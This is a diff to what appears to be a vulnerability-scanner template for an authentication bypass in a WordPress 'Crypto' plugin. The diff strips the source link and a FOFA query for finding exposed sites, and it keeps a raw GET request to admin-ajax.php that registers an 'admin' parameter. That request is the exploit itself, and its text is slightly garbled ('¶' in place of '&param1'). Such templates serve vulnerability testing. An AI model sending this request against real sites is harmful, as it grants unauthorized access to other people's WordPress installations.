@@ -3,12 +3,8 @@ info:
   name: WordPress admin-ajax Crypto 插件 身份认证绕过漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zahv40wmrwpk07us'
+  description: ''
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zahv40wmrwpk07us
-    fofa: '"wp-content/plugins/crypto/"'
 http:
 - raw:
   - 'GET /wp-admin/admin-ajax.php?action=crypto_connect_ajax_process&method_name=register¶m1=admin HTTP/1.1
